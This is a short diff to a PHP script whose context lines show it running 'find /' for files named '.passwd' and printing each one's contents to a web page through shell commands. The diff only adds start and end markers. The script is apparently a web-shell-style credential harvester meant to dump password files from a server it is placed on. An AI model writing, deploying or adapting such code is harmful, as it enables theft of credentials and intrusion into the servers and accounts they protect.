@@ -1,6 +1,7 @@
 <?php
 
 $fileName = ".passwd";
+echo '--- Start ---<br/>';
 
 foreach(myExec("find / -name \"" . $fileName . "\"") as $path) {
     echo getReturnLine() . '---------------------------' . getReturnLine();
@@ -8,6 +9,8 @@ foreach(myExec("find / -name \"" . $fileName . "\"") as $path) {
     myReadFile(myExec("cat " . $path));
     echo getReturnLine() .'---------------------------' . getReturnLine();
 }
+
+echo '<br/>--- End ---';
 
 function myExec($cmd) {
     $output = "";
